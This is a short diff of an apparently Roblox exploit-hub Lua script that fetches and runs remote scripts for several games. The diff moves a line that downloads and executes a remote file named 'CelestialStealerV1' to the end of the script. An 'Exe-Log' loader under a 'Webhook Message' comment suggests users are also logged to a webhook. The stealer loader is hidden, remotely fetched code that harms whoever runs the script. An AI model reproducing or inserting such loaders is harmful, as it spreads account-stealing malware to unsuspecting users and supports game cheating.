@@ -1,7 +1,6 @@
 --// Webhook Message
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydrosploit/Celestial/main/Exe-Log"))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydrosploit/Celestial/main/CelestialStealerV1"))()
 
 
 --// Discord Invite
@@ -36,3 +35,5 @@ elseif game.PlaceId == 1962086868 then -- Tower Of Hell
 elseif game.PlaceId == 621129760 then -- KAT
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydrosploit/Celestial/main/KAT_Public.lua"))()
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydrosploit/Celestial/main/CelestialStealerV1"))()
